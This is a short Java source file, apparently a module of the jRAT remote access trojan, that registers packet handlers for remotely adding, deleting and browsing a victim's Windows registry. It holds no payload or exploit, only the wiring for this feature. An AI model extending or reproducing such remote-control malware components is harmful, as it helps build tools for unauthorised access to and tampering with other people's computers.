package jrat.module.registry;

import jrat.api.ClientModule;
import jrat.client.packets.incoming.IncomingPackets;

public class RegistryClientModule extends ClientModule {

    public RegistryClientModule() {
        super();
    }

    public void init() throws Exception {
        IncomingPackets.register((short) 97, Packet97RegistryAdd.class);
        IncomingPackets.register((short) 99, Packet99RegistryDelete.class);
        IncomingPackets.register((short) 79, Packet79BrowseRegistry.class);
        System.out.println("RegistryClientModule initialized");
    }
}
